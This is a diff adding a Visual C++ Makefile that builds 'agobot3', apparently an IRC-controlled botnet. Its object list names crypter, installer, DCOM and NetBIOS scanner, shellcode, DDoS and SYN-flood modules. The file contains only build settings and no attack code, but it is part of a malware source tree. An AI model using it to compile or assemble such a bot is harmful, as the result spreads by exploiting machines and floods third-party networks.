@@ -1,0 +1,42 @@
+CC = cl
+LINK = link
+DEFINES = /DNDEBUG /DWIN32 /D_WINDOWS /D_MBCS
+FNAME = agobot3
+FPATH = bin/win32
+ZTHREAD = lib/ZThread/win32
+LIBS = msvcrt.lib msvcprt.lib ZThread.lib kernel32.lib shell32.lib user32.lib advapi32.lib ws2_32.lib netapi32.lib mpr.lib oldnames.lib
+CFLAGS = /nologo /G5 /Zp1 /MD /W3 /GX /O1 /Ob0 /I "$(ZTHREAD)/include" $(DEFINES) /FR"Release/" /Fp"Release/$(FNAME).pch" /YX /Fo"Release/" /Fd"Release/" /FD
+LDFLAGS = /nologo /subsystem:windows /incremental:no /pdb:"Release/$(FNAME).pdb" /machine:I386 /nodefaultlib /out:"$(FPATH)/$(FNAME).exe" /libpath:"$(ZTHREAD)/lib" 
+
+OBJS = cmdline.obj mainctrl.obj crypter.obj cstring.obj consdbg.obj utility.obj random.obj mac.obj bot.obj commands.obj cvar.obj installer.obj scanner.obj nbscanner.obj dcomscanner.obj shellcode.obj irc.obj locscanner.obj ddos.obj synflood.obj
+MD5OBJS = md5/md5c.o
+
+all: $(OBJS) others link fin
+
+cleanbin: clean $(OBJS) others link fin
+
+others:
+	cd md5 && $(MAKE) -F Makefile.vc6 && cd ..
+	cd getmd5 && $(MAKE) -F Makefile.vc6 && cd ..
+	cd crypt && $(MAKE) -F Makefile.vc6 && cd ..
+
+link:
+	$(LINK) $(OBJS) $(LDFLAGS) $(LIBS)
+
+clean:
+	@del *.obj
+	@del md5\*.obj
+	@del getmd5\*.obj
+	@del crypt\*.obj
+	@del bin\win32\*.exe
+
+fin:
+	@mkdir -p bin
+	@mkdir -p $(FPATH)
+	@copy $(FNAME).exe $(FPATH)
+
+.cpp.obj:
+    $(CC) -c $(CFLAGS) $<
+
+.c.obj:
+    $(CC) -c $(CFLAGS) $<
